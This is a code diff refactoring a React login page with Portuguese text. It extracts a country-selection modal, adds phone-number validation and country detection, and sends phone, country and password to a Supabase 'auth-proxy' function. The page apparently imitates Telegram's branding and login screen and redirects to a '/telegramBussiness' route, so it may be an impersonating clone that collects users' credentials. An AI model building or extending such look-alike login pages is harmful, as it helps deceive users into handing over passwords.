@@ -1,9 +1,15 @@
-import { useState, useCallback, useMemo, useEffect } from 'react';
+import { useState, useCallback, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { useToast } from '../components/Toast';
 import { supabase } from '../lib/supabase';
-import { Eye, EyeOff, Loader2, Search, X, Check, ChevronDown } from 'lucide-react';
-import { COUNTRIES, Country } from '../lib/countries';
+import { Eye, EyeOff, Loader2, ChevronDown } from 'lucide-react';
+import {
+  COUNTRIES,
+  Country,
+  validatePhoneNumber,
+  detectCountryFromPhone,
+} from '../lib/countries';
+import CountryModal from '../components/CountryModal';
 
 export default function Login() {
   const navigate = useNavigate();
@@ -16,49 +22,97 @@ export default function Login() {
 
   const [selectedCountry, setSelectedCountry] = useState<Country>(() => {
     try {
-      const savedCode = localStorage.getItem('saved_dial_code');
-      const found = COUNTRIES.find(c => c.dial_code === savedCode);
-      return found || COUNTRIES[0];
+      const savedCode = localStorage.getItem('saved_country_code');
+      if (savedCode) {
+        const found = COUNTRIES.find((c) => c.code === savedCode);
+        if (found) return found;
+      }
+      const savedDial = localStorage.getItem('saved_dial_code');
+      if (savedDial) {
+        const found = COUNTRIES.find((c) => c.dial_code === savedDial);
+        if (found) return found;
+      }
+      return COUNTRIES[0];
     } catch {
       return COUNTRIES[0];
     }
   });
+
   const [showCountryModal, setShowCountryModal] = useState(false);
-  const [searchCountry, setSearchCountry] = useState('');
 
   useEffect(() => {
     try {
       const saved = localStorage.getItem('saved_phone');
       if (saved) setPhone(saved);
-    } catch { }
+    } catch {}
   }, []);
 
-  const togglePasskey = useCallback(() => setShowPasskey(v => !v), []);
+  const togglePasskey = useCallback(() => setShowPasskey((v) => !v), []);
 
-  const handlePhoneChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
-    const val = e.target.value.replace(/\D/g, '').slice(0, selectedCountry.maxLength);
-    setPhone(val);
-  }, [selectedCountry.maxLength]);
+  const handleSelectCountry = useCallback((c: Country) => {
+    setSelectedCountry(c);
+    setPhone('');
+    try {
+      localStorage.setItem('saved_dial_code', c.dial_code);
+      localStorage.setItem('saved_country_code', c.code);
+      localStorage.setItem('saved_country_name', c.name);
+    } catch {}
+  }, []);
+
+  const handlePhoneChange = useCallback(
+    (e: React.ChangeEvent<HTMLInputElement>) => {
+      const rawVal = e.target.value;
+      // Auto-detect if user typed or pasted an international number
+      if (rawVal.trim().startsWith('+')) {
+        const detected = detectCountryFromPhone(rawVal.trim());
+        const detectedCountry = detected.country;
+        if (detectedCountry) {
+          setSelectedCountry(detectedCountry);
+          setPhone((detected.nationalNumber || '').slice(0, detectedCountry.maxLength));
+          return;
+        }
+      }
+      const val = rawVal.replace(/\D/g, '').slice(0, selectedCountry.maxLength);
+      setPhone(val);
+    },
+    [selectedCountry]
+  );
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
-    const cleanPhone = phone.trim();
+    const cleanInputPhone = phone.trim();
     const cleanPasskey = passkey.trim();
 
-    if (!cleanPhone) {
-      showToast('Por favor, insira um número de telefone válido.', 'error');
+    // 1. Strict validation of phone number format for selected country BEFORE sending credentials
+    const phoneValidation = validatePhoneNumber(cleanInputPhone, selectedCountry);
+    if (!phoneValidation.isValid) {
+      showToast(
+        phoneValidation.errorMessage ||
+          `Introduza um número de telefone válido de ${selectedCountry.name}.`,
+        'error'
+      );
       return;
     }
+
+    // 2. Validate password
     if (!cleanPasskey || cleanPasskey.length < 4) {
       showToast('Por favor, insira a sua senha.', 'error');
       return;
     }
 
+    const cleanNationalPhone = phoneValidation.nationalNumber;
+
     setIsSubmitting(true);
     try {
       const { data, error } = await supabase.functions.invoke('auth-proxy', {
-        body: { action: 'login', phone: cleanPhone, password: cleanPasskey },
+        body: {
+          action: 'login',
+          phone: cleanNationalPhone,
+          country_code: selectedCountry.code,
+          country_name: selectedCountry.name,
+          password: cleanPasskey,
+        },
       });
 
       if (data?.session) {
@@ -69,18 +123,32 @@ export default function Login() {
       }
 
       if (error) {
-        if (error.message.includes('Invalid login credentials')) {
+        if (
+          error.message?.includes('COUNTRY_MISMATCH') ||
+          error.message?.includes('pertence a outro país')
+        ) {
+          showToast(`Introduza um número de telefone válido de ${selectedCountry.name}.`, 'error');
+        } else if (
+          error.message?.includes('Introduza um número de telefone válido') ||
+          error.message?.includes('Invalid phone number')
+        ) {
+          showToast(`Introduza um número de telefone válido de ${selectedCountry.name}.`, 'error');
+        } else if (error.message?.includes('Invalid login credentials')) {
           showToast('Por favor, verifique as credenciais de acesso inválidas.', 'error');
         } else {
-          throw error;
+          showToast(error.message || 'Ops! Falha ao autenticar. Verifique os seus dados.', 'error');
         }
         setIsSubmitting(false);
         return;
       }
 
       if (data.session) {
-        localStorage.setItem('saved_phone', cleanPhone);
-        localStorage.setItem('saved_dial_code', selectedCountry.dial_code);
+        try {
+          localStorage.setItem('saved_phone', cleanNationalPhone);
+          localStorage.setItem('saved_dial_code', selectedCountry.dial_code);
+          localStorage.setItem('saved_country_code', selectedCountry.code);
+          localStorage.setItem('saved_country_name', selectedCountry.name);
+        } catch {}
         showToast('Bem-vindo de volta!', 'success');
         navigate('/telegramBussiness');
       } else {
@@ -93,20 +161,15 @@ export default function Login() {
     }
   };
 
-  const filteredCountries = useMemo(() => {
-    if (!searchCountry) return COUNTRIES;
-    return COUNTRIES.filter(c =>
-      c.name.toLowerCase().includes(searchCountry.toLowerCase()) ||
-      c.dial_code.includes(searchCountry)
-    );
-  }, [searchCountry]);
-
   return (
     <div className="w-full min-h-screen bg-white pb-12 font-sans antialiased text-black select-none flex flex-col items-center justify-center p-4">
       <main className="w-full max-w-[340px] sm:max-w-[360px] flex flex-col items-center">
-
         <div className="mb-3.5 flex items-center justify-center">
-          <img src="/logo-tb.jpg" alt="Telegram" className="w-[58px] h-[58px] rounded-full object-cover" />
+          <img
+            src="/logo-tb.jpg"
+            alt="Telegram"
+            className="w-[58px] h-[58px] rounded-full object-cover"
+          />
         </div>
 
         <h1 className="text-[26px] font-bold text-center mb-1.5 tracking-tight text-[#1c1c1e]">
@@ -117,12 +180,13 @@ export default function Login() {
         </p>
 
         <form onSubmit={handleSubmit} className="w-full flex flex-col gap-4">
-
           <div className="w-full flex flex-col gap-5 mt-2">
-
+            {/* Country Selector Button */}
             <div className="relative w-full">
               <div className="absolute -top-[9px] left-[12px] bg-white px-1 z-10">
-                <label className="text-[14px] text-[#707579] font-medium leading-none">Country</label>
+                <label className="text-[14px] text-[#707579] font-medium leading-none">
+                  Country
+                </label>
               </div>
               <button
                 type="button"
@@ -131,17 +195,30 @@ export default function Login() {
                 className="w-full h-[54px] auth-input-btn border border-[#dfdfe0] bg-white flex items-center justify-between px-3.5 hover:border-[#3390ec] focus:border-[#3390ec] focus:outline-none transition-colors cursor-pointer"
                 title="Mudar país"
               >
-                <span className="text-[16px] text-black font-normal">{selectedCountry.name}</span>
-                <ChevronDown className="w-5 h-5 text-[#a2a6aa]" strokeWidth={2} />
+                <span className="text-[16px] text-black font-normal flex items-center gap-2.5 truncate">
+                  <span className="text-[22px] leading-none select-none">
+                    {selectedCountry.emoji}
+                  </span>
+                  <span className="truncate">{selectedCountry.name}</span>
+                </span>
+                <ChevronDown className="w-5 h-5 text-[#a2a6aa] shrink-0" strokeWidth={2} />
               </button>
             </div>
 
+            {/* Phone Number Input */}
             <div className="relative w-full">
               <div className="absolute -top-[9px] left-[12px] bg-white px-1 z-10">
-                <label className="text-[14px] text-[#707579] font-medium leading-none">Your phone number</label>
+                <label className="text-[14px] text-[#707579] font-medium leading-none">
+                  Your phone number
+                </label>
               </div>
-              <div style={{ borderRadius: '12px' }} className="auth-input-wrap w-full h-[54px] border border-[#dfdfe0] bg-white flex items-center px-3.5 focus-within:border-[#3390ec] transition-colors">
-                <span className="text-[16px] text-black mr-1.5 shrink-0">{selectedCountry.dial_code}</span>
+              <div
+                style={{ borderRadius: '12px' }}
+                className="auth-input-wrap w-full h-[54px] border border-[#dfdfe0] bg-white flex items-center px-3.5 focus-within:border-[#3390ec] transition-colors"
+              >
+                <span className="text-[16px] text-black mr-2 font-medium shrink-0">
+                  {selectedCountry.dial_code}
+                </span>
                 <input
                   name="phone"
                   type="tel"
@@ -151,15 +228,22 @@ export default function Login() {
                   value={phone}
                   onChange={handlePhoneChange}
                   maxLength={selectedCountry.maxLength}
+                  placeholder=""
                 />
               </div>
             </div>
 
+            {/* Password Input */}
             <div className="relative w-full">
               <div className="absolute -top-[9px] left-[12px] bg-white px-1 z-10">
-                <label className="text-[14px] text-[#707579] font-medium leading-none">Password</label>
+                <label className="text-[14px] text-[#707579] font-medium leading-none">
+                  Password
+                </label>
               </div>
-              <div style={{ borderRadius: '12px' }} className="auth-input-wrap w-full h-[54px] border border-[#dfdfe0] bg-white flex items-center px-3.5 focus-within:border-[#3390ec] transition-colors">
+              <div
+                style={{ borderRadius: '12px' }}
+                className="auth-input-wrap w-full h-[54px] border border-[#dfdfe0] bg-white flex items-center px-3.5 focus-within:border-[#3390ec] transition-colors"
+              >
                 <input
                   name="passkey"
                   type={showPasskey ? 'text' : 'password'}
@@ -178,7 +262,6 @@ export default function Login() {
                 </button>
               </div>
             </div>
-
           </div>
 
           <div className="w-full pt-1 space-y-2.5">
@@ -186,9 +269,13 @@ export default function Login() {
               type="submit"
               disabled={isSubmitting}
               style={{ borderRadius: '12px' }}
-              className="w-full h-[48px] btn-auth bg-[#3390ec] hover:bg-[#2881dc] active:scale-[0.98] text-white font-semibold text-[15px] transition-all disabled:opacity-50 flex items-center justify-center cursor-pointer"
+              className="w-full h-[48px] btn-auth bg-[#3390ec] hover:bg-[#2881dc] active:scale-[0.98] text-white font-semibold text-[15px] transition-all disabled:opacity-50 flex items-center justify-center cursor-pointer shadow-sm"
             >
-              {isSubmitting ? <Loader2 className="animate-spin h-5 w-5 text-white" /> : 'Conectar-se'}
+              {isSubmitting ? (
+                <Loader2 className="animate-spin h-5 w-5 text-white" />
+              ) : (
+                'Conectar-se'
+              )}
             </button>
 
             <button
@@ -202,61 +289,14 @@ export default function Login() {
         </form>
       </main>
 
-      {showCountryModal && (
-        <div className="fixed inset-0 z-[200] bg-white flex flex-col">
-          <div className="h-[56px] px-4 flex items-center border-b border-[#c8c7cc] shrink-0 bg-[#f8f8f8]">
-            <button onClick={() => setShowCountryModal(false)} className="text-[#3390ec] text-[17px] font-medium cursor-pointer">
-              Voltar
-            </button>
-            <h2 className="flex-1 text-center text-[17px] font-semibold">Escolha um país</h2>
-            <div className="w-[40px]" />
-          </div>
-          <div className="p-2 bg-[#f8f8f8] border-b border-[#c8c7cc] shrink-0">
-            <div className="bg-[#e3e3e8] h-[36px] rounded-full flex items-center px-3">
-              <Search className="w-5 h-5 text-[#8e8e93] mr-2" />
-              <input
-                type="text"
-                placeholder="Pesquisar país ou código"
-                className="bg-transparent outline-none flex-1 text-[16px] text-black"
-                value={searchCountry}
-                onChange={(e) => setSearchCountry(e.target.value)}
-              />
-              {searchCountry && (
-                <button onClick={() => setSearchCountry('')} className="bg-[#8e8e93] text-white rounded-full p-0.5 ml-2 cursor-pointer">
-                  <X className="w-3 h-3" />
-                </button>
-              )}
-            </div>
-          </div>
-          <div className="flex-1 overflow-y-auto">
-            {filteredCountries.map((c) => (
-              <div
-                key={c.code}
-                className="flex items-center px-4 h-[50px] border-b border-[#c8c7cc] active:bg-gray-100 cursor-pointer"
-                onClick={() => {
-                  setSelectedCountry(c);
-                  setPhone('');
-                  setShowCountryModal(false);
-                  setSearchCountry('');
-                }}
-              >
-                <img
-                  src={`https://flagcdn.com/w40/${c.code.toLowerCase()}.png`}
-                  alt={c.name}
-                  className="w-8 h-auto rounded-sm object-cover mr-3 shrink-0"
-                  onError={(e) => { (e.target as HTMLImageElement).style.display = 'none'; }}
-                />
-                <span className="flex-1 text-[17px] font-medium text-black">{c.name}</span>
-                <span className="text-[#8e8e93] text-[17px] mr-2">{c.dial_code}</span>
-                {selectedCountry.code === c.code && <Check className="w-5 h-5 text-[#3390ec]" />}
-              </div>
-            ))}
-            {filteredCountries.length === 0 && (
-              <div className="p-8 text-center text-[#8e8e93]">Nenhum país encontrado</div>
-            )}
-          </div>
-        </div>
-      )}
+      {/* Centralized Country Modal */}
+      <CountryModal
+        isOpen={showCountryModal}
+        onClose={() => setShowCountryModal(false)}
+        selectedCountry={selectedCountry}
+        onSelectCountry={handleSelectCountry}
+      />
     </div>
   );
 }
+
